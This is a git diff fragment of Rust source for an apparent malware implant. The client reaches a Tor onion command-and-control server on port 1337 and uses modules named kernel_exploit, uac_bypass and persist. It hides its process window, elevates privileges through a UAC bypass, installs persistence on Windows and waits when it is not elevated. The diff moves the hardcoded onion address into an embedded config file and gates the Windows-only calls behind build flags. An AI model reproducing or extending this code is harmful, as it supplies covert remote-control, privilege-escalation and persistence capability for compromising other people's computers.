@@ -9,8 +9,9 @@ mod kernel_exploit;
 #[cfg(target_os = "windows")]
 mod persist;
 
+#[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
-use std::env;
+
 use arti_client::{TorClient, TorClientConfig, DataStream};
 use tor_rtcompat::PreferredRuntime;
 use tokio::io::split;
@@ -21,29 +22,35 @@ use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
 use rand::Rng;
 
+
+
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
+const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");
 
-/// Public configuration struct
+fn get_onion_host() -> String {
+    String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
+}
+
 #[derive(Clone, Debug)]
 pub struct ClientConfig {
     pub onion: String,
     pub port: u16,
 }
 
+
 impl Default for ClientConfig {
     fn default() -> Self {
         Self {
-            onion: "7i6xbfs5e7uxxvjadr2nse3yeirqs5oolkypnajr37puw22uhkwz7nqd.onion".into(),
+            onion: get_onion_host(),
             port: 1337,
         }
     }
 }
-
 /// Initialize Tor client
 async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     let config = TorClientConfig::default();
@@ -250,9 +257,12 @@ pub async fn netclient() -> Result<()> {
         uac_bypass::elevate_uac(&exe_str);
         return Ok(());
     } 
+    #[cfg(target_os = "windows")]
     persist::persist()?;
+    #[cfg(target_os = "windows")]
     if !is_elevated(){
         sleep(Duration::from_secs(61)).await;
     }
+    
     netclient_run(ClientConfig::default()).await
 }
